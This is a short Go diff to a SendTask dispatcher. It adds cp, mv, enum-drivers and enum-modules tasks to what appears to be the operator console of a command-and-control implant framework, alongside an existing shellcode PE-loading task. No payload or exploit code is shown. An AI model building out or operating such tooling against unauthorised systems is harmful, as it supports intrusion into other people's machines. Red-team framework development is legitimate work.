@@ -499,6 +499,10 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskSimple(c, clientId, command)
 	case "touch":
 		PrepareTaskWithArgs(c, clientId, command, "<filePath> <fileContents>: ")
+	case "cp":
+		PrepareTaskWithArgs(c, clientId, command, "<sourcePath> <destinationPath>: ")
+	case "mv":
+		PrepareTaskWithArgs(c, clientId, command, "<sourcePath> <destinationPath>: ")
 	case "ls":
 		PrepareTaskWithArgs(c, clientId, command, "<Directory> ")
 	case "cd":
@@ -661,6 +665,10 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskWithOneArg(c, clientId, command, "<pid>: ")
 	case "load-custom-pe":
 		PrepareShellcodeTask(c, clientId, command, "<Local PE to send> <exe,dll> <1,0>: ")
+	case "enum-drivers":
+		PrepareTaskSimple(c, clientId, command)
+	case "enum-modules":
+		PrepareTaskWithOneArg(c, clientId, command, "<pid>: ")
 	default:
 		c.Println("Task not found.")
 	}
